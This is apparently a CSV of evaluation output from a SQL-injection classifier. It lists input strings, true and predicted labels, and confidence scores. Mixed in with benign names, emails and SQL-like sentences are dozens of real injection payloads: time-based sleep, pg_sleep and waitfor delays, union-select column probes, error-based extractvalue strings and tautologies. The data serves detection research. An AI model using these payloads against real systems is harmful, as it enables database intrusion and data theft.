text,true_label,predicted_label,confidence_sql_injection
gasull vadell,0,0,0.004468253314358248
donadio_honig@donkr.zr,0,0,0.004468253314358248
dueas cristaldo,0,0,0.004468253314358248
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,1,1,0.99
"-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#",1,1,1.0
17403,0,0,0.004468253314358248
"  select soilid as id, muscle as many from band",0,0,0.0
select count ( especially )  from nodded,0,0,0.0
culubret lluss,0,0,0.004468253314358248
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  +'",1,1,1.0
pawley@santacruzdelvoto.vu,0,0,0.004468253314358248
"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and 'rupq'  =  'rupq",1,1,1.0
1'   )    )     )   and 4595  =  4595#,1,1,1.0
23734,0,0,0.004468253314358248
1' in boolean mode  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,1.0
"1"" union all select null,null,null,null,null,null,null,null--",1,1,1.0
select * from  ( select dull from wire ) ,0,0,0.0
"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",1,1,1.0
recomendaci$n,0,0,0.012968046660272936
"  select direction,engine from kitchen where want = 'yes' union select shut, even from behavior",0,0,0.0
select * from remove where indicate between copper09/01/1996them and easier15/31/1996couple,0,0,0.0
"-1164""  )   union all select 6617,6617,6617,6617,6617,6617--",1,1,1.0
ambiental,0,0,0.004468253314358248
81451206h,0,0,0.004468253314358248
2366,0,0,0.004468253314358248
select * from thread where    not eleven = 'worse',0,0,0.0
select egg ( s )  from substance select shot from manufacturing,0,0,0.0
" select * from users where id  =  1 +   (  \+  )   union select null,@@version -- 1",1,1,1.0
"   select shippers.shippername, count ( orders.orderid )  as numberoforders from    ordersleft join shippers on orders.shipperid  =  shippers.shipperid  group by shippername;",0,0,0.0
5.84996e+15,0,0,0.0
select * from hearing where price not between 10 and 20,0,0,0.0
"1  )   where 1185  =  1185 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,1,1.0
select count ( distinct soldier )  from ourselves,0,0,0.0
" select column_name ( s )  from drink,bank",0,0,0.0
1' where 7613  =  7613,1,1,1.0
select top 3 * from tune select * from feel 3select * from statement,0,0,0.0
alpuche simani,0,0,0.004468253314358248
select * from coal where foot = 'above' fetch first 3 rows only,0,0,0.0
select * from  ( select somehow from rain ) ,0,0,0.0
hanley,0,0,0.004468253314358248
1%'   )    )     )   rlike sleep  (  5  )  #,1,1,1.0
6085,0,0,0.004468253314358248
66750565b,0,0,0.004468253314358248
select   (  case when   (  5847  =  2826  )   then 5847 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,1,1.0
"1',  (  select   (  case when   (  3902  =  3902  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",1,1,1.0
"faus 195,",0,0,0.004468253314358248
-8515' or 1329  =  9536,1,1,1.0
"-9445  )   as dmur where 4371  =  4371 union all select 4371,4371,4371,4371,4371,4371,4371,4371,4371,4371#",1,1,1.0
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1,1,1.0
-7404' where 1536  =  1536 order by 1#,1,1,0.99
"1""  )   as gffq where 4387  =  4387 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,1,1.0
cerpa oitavn,0,0,0.004468253314358248
select distinct art from if,0,0,0.02
"-1763%"" or   (  8459  =  8459  )  *4906 and ""%""  =  """,1,1,0.99
"   select stranger,studying,minute,process,smaller     (  (  specific join means on order.loss =  correctly.sort )   inner join droppedon orders.plenty =  home.justid ) ",0,0,0.03
cufre sans,0,0,0.004468253314358248
1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1,1.0
8.2197e+15,0,0,0.0
"1 and elt  (  1210  =  1210,sleep  (  5   )    )   ",1,1,1.0
"1""  )   as tuem where 1328  =  1328",1,1,1.0
"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'cfhi' like 'cfhi",1,1,1.0
"select atan ( -0.8, 2 ) ;",0,0,0.0
"-2855""   )    )     )   union all select 1496,1496,1496,1496#",1,1,1.0
roco@forohh.ge,0,0,0.004468253314358248
"-3359 union all select 4675,4675,4675--",1,1,1.0
-2316'   )    )     )   or 8519  =  6010,1,1,1.0
1  )   as rlft where 1670  =  1670 waitfor delay '0:0:5'--,1,1,1.0
"1""  )   union all select null,null,null,null,null,null,null--",1,1,1.0
select * from exciting fetch first 50 percent rows only,0,0,0.0
sprouse,0,0,0.004468253314358248
1   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  1601  =  1601,1,1,1.0
select avg ( bark ) from minerals select sum ( brown ) ,0,0,0.0
50700,0,0,0.004468253314358248
enratonarse,0,0,0.004468253314358248
1   )    )    as qgma where 7675  =  7675 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,1,1.0
"1%""  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""%""  =  """,1,1,1.0
-1217'   )    )     )   order by 1#,1,1,1.0
he53e9ona,0,0,0.004468253314358248
select avg ( price ) from forward,0,0,0.0
select avg ( faster ) from seldom select sum ( rain ) ,0,0,0.0
"1"" and 9198  =  9198--",1,1,1.0
"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",1,1,1.0
-6567'   )    )    union all select 3217#,1,1,1.0
"1'  )   where 6081  =  6081 union all select null,null,null,null,null,null,null,null,null--",1,1,1.0
select case when 7951  =  1147 then 1 else null end--,1,1,1.0
1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,1,1,1.0
06434691g,0,0,0.004468253314358248
"1""  )   as bpmk where 6412  =  6412 union all select null,null,null,null#",1,1,1.0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  'qfls'  =  'qfls",1,1,1.0
select count ( * )  as route,0,0,0.0
select min ( condition )  as sand from tent,0,0,0.0
tordellego,0,0,0.004468253314358248
1'+  (  select 'jmdl' where 7827  =  7827,1,1,1.0
-3431%'  )   or 9323  =  9323#,1,1,1.0
1'+  (  select 'gtqr' where 5660  =  5660,1,1,1.0
-5217 where 3620  =  3620 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,1,1.0
uriz carmona,0,0,0.004468253314358248
"1""   )    )    as dshc where 9911  =  9911 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
hache6,0,0,0.004468253314358248
van_eyk,0,0,0.004468253314358248
"1""  )   as htyo where 8322  =  8322 and 4595  =  4595#",1,1,0.9916666666666666
"  select once,meat,hat from only left join orders on either.sleptid =  to.poetry order by rocky.faster",0,0,0.0
"1%"" and 6408  =  7959--",1,1,1.0
1' where 5035  =  5035 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1,1.0
"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""nzhj"" like ""nzhj",1,1,1.0
select min ( wooden )  as sight from valuable,0,0,0.0
tronchuda,0,0,0.004468253314358248
"  select * from harbor where butter in  ( 'correct', 'gain', 'load' )  ",0,0,0.0
hetera,0,0,0.004468253314358248
select avg ( mix ) from write select sum ( harder ) ,0,0,0.0
alcolea,0,0,0.004468253314358248
select * from heavy fetch first 50 percent rows only,0,0,0.0
" select * from electric order by mainly, sort",0,0,0.0
select top from older union select married from way order by airplane,0,0,0.0
select count ( * )  as noon,0,0,0.0
"  select * from missing where fairly not in  ( 'father', 'industry', 'travel' )  ",0,0,0.0
-3088' or 6872  =  6872 and 'miwk'  =  'miwk,1,1,1.0
select distinct rose from public,0,0,0.0
select * from region where pattern like '%take%',0,0,0.0
or 'unusual'   =   'unusual',1,1,1.0
"1"" where 6023  =  6023",1,1,1.0
select avg ( noted ) from key,0,0,0.0
"select term_id, meta_key, meta_value from wp_termmeta where term_id in  ( 2712,3146,3152,2720,3078,2766,2679 )  order by meta_id asc",0,0,0.0
